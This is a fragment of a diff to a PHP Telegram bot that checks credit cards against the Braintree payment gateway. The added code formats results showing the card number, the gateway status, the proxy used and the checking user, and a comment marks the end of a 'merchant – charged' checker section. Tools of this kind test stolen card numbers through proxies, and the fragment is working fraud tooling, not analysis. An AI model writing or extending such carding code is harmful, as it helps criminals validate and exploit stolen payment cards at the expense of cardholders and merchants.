+    $live = False;
+} else {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = False;
+}
+
+if ($live) {
+    editMessage($chat_id, $respuesta, $id_text);
+} else {
+    editMessage($chat_id, $respuesta, $id_text);
+}
+
+//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
+ob_flush();
+
+}
+
+
+
+
 
 elseif((strpos($message, "!ho") === 0)||(strpos($message, "/ho") === 0)||(strpos($message, ".ho") === 0)){
 $lista = substr($message, 4);
@@ -2506,9 +2759,6 @@ curl_setopt_array($curl, [
 ]);
 
 
-$response = curl_exec($curl);
-$err = curl_error($curl);
-curl_close($curl);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
